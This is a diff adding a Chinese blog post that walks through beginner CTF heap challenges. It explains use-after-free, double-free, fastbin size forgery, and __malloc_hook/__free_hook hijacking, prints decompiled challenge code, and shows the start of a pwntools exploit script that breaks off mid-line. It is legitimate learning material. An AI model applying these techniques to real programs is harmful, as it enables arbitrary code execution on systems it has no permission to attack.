@@ -155,6 +155,349 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">几道入门堆题的复现</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-23 21:13:45" itemprop="dateCreated datePublished" datetime="2022-04-23T21:13:45+08:00">2022-04-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-30 21:40:15" itemprop="dateModified" datetime="2022-04-30T21:40:15+08:00">2022-04-30</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
+<li><p>当存在uaf漏洞，且程序本身提供了edit这样对堆中的内容直接修改的功能的时候，就可以直接修改fd指针进行堆块伪造</p>
+</li>
+<li><p>当存在uaf漏洞，但是程序中不存在edit这样的功能，也就是说堆中的内容是在创建该堆时一并输入到堆中的，这种情况下就可以构造double free来修改fd指针进行堆块的伪造</p>
+</li>
+<li><p>fast bin有一个检查：当从一个fast bin链表中取出堆块时，会检查该取出的堆块的size位是否与该fast bin链表所对应的大小一致，检查不通过就会报错。这带来的一个问题就是我们不能直接让fd指针指向任意位置然后把这个伪造的堆块从fast bin中取出，我们还需要伪造堆块的size位才能将其成功malloc出来。</p>
+<p>结合图片说具体一点，例如我们现在通过某种方法将保存0x70大小的chunk的fast bin构造成如下：</p>
+<img src="/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/%E7%9F%A5%E8%AF%86%E7%82%B9-1.jpg" class>
+
+<p>这里只是举个例子，我将<code>0xbfe0c0</code>位置的堆块的<code>fd</code>指针指向了<code>__malloc_hook - 0x10</code>的位置，显然我们最后的目的是在<code>__malloc_hook - 0x10</code>处（也就是<code>__malloc_hook</code>附近）申请出一个堆块，从而让我们能够修改<code>__malloc_hook</code>中的内容，然而我们看看该位置+一个字长处的值</p>
+<img src="/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/%E7%9F%A5%E8%AF%86%E7%82%B9-2.jpg" class>
+
+<p>因为这个值跟fast bin链表对应的大小不同，所以这个伪造的chunk是无法直接申请出来的，当我们尝试将其从fast bin中malloc出来时，程序就会报错</p>
+<img src="/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/%E7%9F%A5%E8%AF%86%E7%82%B9-3.jpg" class>
+
+<p>解决方法也很简单，我们只需要再伪造chunk的size位即可，我们观察一下<code>__malloc_hook</code>附近的数据</p>
+<img src="/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/%E7%9F%A5%E8%AF%86%E7%82%B9-4.jpg" class>
+
+<p>会发现就有一些数据适合让我们进行伪造，我们调好适当的偏移，让伪造的chunk的size位正好为<code>0x7f</code>就能通过检查，因为<code>0x7f</code>正好在<code>0x70</code>的范围内，并且<code>0x7f</code>的最低一位是1。</p>
+<p>我们调整好偏移之后再来看一下：</p>
+<img src="/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/%E7%9F%A5%E8%AF%86%E7%82%B9-5.jpg" class>
+
+<p>这样就完成了size位的伪造，我们就能成功在<code>__malloc_hook</code>附近申请出一个堆块，进而修改<code>__malloc_hook</code></p>
+<p>这里还涉及到两个问题：</p>
+<ul>
+<li><p>在上面的例子中我们知道<code>__malloc_hook</code>附近是会有现有的数据能让我们完成size位的伪造的（目前只知道libc-2.23和libc-2.27会有，更高版本不知道还有没有），但是我们查看<code>__free_hook</code>附近，会发现什么都没有</p>
+<img src="/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/%E7%9F%A5%E8%AF%86%E7%82%B9-6.jpg" class>
+
+<p>这也就说明我们是无法直接在<code>__free_hook</code>附近得到一个<code>fast bin</code>大小的堆块的，我们得通过一些其他方法作为铺垫（例如unsorted bin attack），然后才能继续下一步</p>
+</li>
+<li><p><code>__malloc_hook</code>的参数是我们无法直接控制的（我目前的了解），也就是说我们要通过修改<code>__malloc_hook</code>来拿shell的话只能将其改成one_gadget或者后门函数，但是<code>__free_hook</code>的参数是我们可控的，其会将传进<code>free</code>函数的指针来作为第一个参数，也就是说我们只需要在chunk的数据区开头写入<code>/bin/sh</code>，修改<code>__free_hook</code>为<code>system</code>之后将这个chunk free掉即可。</p>
+</li>
+</ul>
+</li>
+<li><p>tcache虽然是单向链表，但是会将bk指针指向bin头，并且会<strong>通过这个指针来查找其所指向的整个bin链表中</strong>有无和这个bk指针所属的chunk相同的chunk，简单点说就是一个加强版的double free检查。绕过也很简单，只需要修改这个bk指针即可。</p>
+</li>
+</ol>
+<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>main函数如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  alarm(<span class="number">0x64</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;1. add&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;2. delete&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;3. edit&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;4. show&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">      v3 = get_num();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">666</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_15C9();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">666</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt; <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">switch</span> ( v3 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          edit();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          add();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          <span class="keyword">delete</span>();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_15:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;oho! BadChoice!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为复现过程中没有用到sub_15C9()函数所以省略。add函数如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> num; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index?&quot;</span>);</span><br><span class="line">  num = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( (num &amp; <span class="number">0xFFFFFFF0</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;BadIndex!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Size?&quot;</span>);</span><br><span class="line">  v2 = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0</span> || v2 &gt; <span class="number">96</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;BadSize!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  qword_4060[num] = <span class="built_in">malloc</span>(v2);</span><br><span class="line">  result = v2;</span><br><span class="line">  dword_40E0[num] = v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>delete函数如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> num; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index?&quot;</span>);</span><br><span class="line">  num = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( (num &amp; <span class="number">0xFFFFFFF0</span>) != <span class="number">0</span> || !qword_4060[num] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Errrrrrrrrrrror!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(qword_4060[num]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为没有销毁指针，所以存在uaf漏洞</p>
+<p>edit函数如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> num; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index?&quot;</span>);</span><br><span class="line">  num = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( (num &amp; <span class="number">0xFFFFFFF0</span>) != <span class="number">0</span> || !qword_4060[num] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;BadIndex!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Content?&quot;</span>);</span><br><span class="line">  ((&amp;sub_1248 + <span class="number">1</span>))(); <span class="comment">//这里似乎有花指令影响了反汇编，但是不重要，直到该函数的功能是编辑块就行了</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>show函数如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> num; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index?&quot;</span>);</span><br><span class="line">  num = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( (num &amp; <span class="number">0xFFFFFFF0</span>) != <span class="number">0</span> || !*(&amp;qword_4060 + num) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;BadIndex!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(*(&amp;qword_4060 + num));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>题目漏洞很简单，因为free掉堆块之后没有进行指针的销毁，所以存在uaf漏洞，而且edit函数可以通过指针直接修改堆块中的内容，所以可以直接在bins上伪造堆块，从而实现任意地址写，然后劫持<code>__free_hook</code>或者<code>__malloc_hook</code>即可</p>
+<p>此题我们要泄漏libc的话就需要将chunk free到unsorted bin中，而因为add函数中允许我们申请的堆块最大大小为0x60，属于fast bins的范围，所以我们需要先通过伪造chunk来实现任意地址写的方式来修改某个chunk的size在unsorted bin范围中，所以我们还需要先泄漏堆地址。</p>
+<p>综上，这题的思路就很明确了：</p>
+<ol>
+<li>泄漏heap地址</li>
+<li>修改某个chunk的size，使该chunk free掉之后进入unsorted bin</li>
+<li>泄漏libc</li>
+<li>劫持<code>__free_hook</code>或者<code>__malloc_hook</code></li>
+</ol>
+<h4 id="libc-2-27下的复现"><a href="#libc-2-27下的复现" class="headerlink" title="libc-2.27下的复现"></a>libc-2.27下的复现</h4><p>2.27版本中存在tcache</p>
+<h5 id="泄漏heap地址"><a href="#泄漏heap地址" class="headerlink" title="泄漏heap地址"></a>泄漏heap地址</h5><p>因为show函数的存在，</p>
+<h3 id="Roc826s-Note"><a href="#Roc826s-Note" class="headerlink" title="Roc826s_Note"></a>Roc826s_Note</h3><p>版本libc-2.23</p>
+<p>还是菜单堆题，主要涉及函数如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-----------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.add&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.dele&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.show&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4.exit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">putchar</span>(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">19</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;full!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !(&amp;<span class="built_in">list</span>)[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;size?&quot;</span>);</span><br><span class="line">  v2 = readi(<span class="string">&quot;size?&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt; <span class="number">0x90</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid size!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  (&amp;<span class="built_in">list</span>)[i] = <span class="built_in">malloc</span>(v2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">  read_n((&amp;<span class="built_in">list</span>)[i], v2);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;done!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">dele</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">  v1 = readi(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (&amp;<span class="built_in">list</span>)[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((&amp;<span class="built_in">list</span>)[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;done!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">  v1 = readi(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (&amp;<span class="built_in">list</span>)[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>((&amp;<span class="built_in">list</span>)[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在dele()函数中存在uaf漏洞，因为没有单独的edit功能，所以需要构造double free来修改fd指针伪造堆块</p>
+<p>因为限制申请的chunk最大大小为0x90，所以能直接利用unsorted bin来泄漏libc地址</p>
+<p>思路：</p>
+<ol>
+<li>泄漏libc和heap</li>
+<li>伪造chunk修改<code>__free_hook</code>/<code>__malloc_hook</code>即可</li>
+</ol>
+<h4 id="修改-malloc-hook"><a href="#修改-malloc-hook" class="headerlink" title="修改__malloc_hook"></a>修改__malloc_hook</h4><p>泄漏libc后构造一个double free来在<code>__malloc_hook</code>附近申请一个堆块即可</p>
+<h4 id="修改-free-hook"><a href="#修改-free-hook" class="headerlink" title="修改__free_hook"></a>修改__free_hook</h4><p>改<code>__free_hook</code>要稍微麻烦点，可以先利用unsorted bin attack在<code>__free_hook</code>附近写入一个libc地址，这样就能让<code>__free_hook</code>附近有可用的能够用来伪造size位的数据了(0x7f)</p>
+<p>具体一点：</p>
+<ol>
+<li>泄漏libc和heap</li>
+<li>在unsorted bin chunk前面申请一个堆块，从而修改unsorted bin chunk的bk指针指向<code>__free_hook</code>附近</li>
+<li>将这个unsorted bin chunk malloc出来，这个解链的过程中unsorted bin chunk就会将其<code>fd</code>的值写入<code>bk-&gt;fd</code>中，这样就使得<code>__free_hook</code>附近出现了可用的数据</li>
+<li>再正常利用double free来伪造堆块从而修改<code>__free_hook</code>即可</li>
+</ol>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./Roc826&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./Roc826&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node4.buuoj.cn&quot;,28612)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recv(timeout = <span class="number">0.25</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span 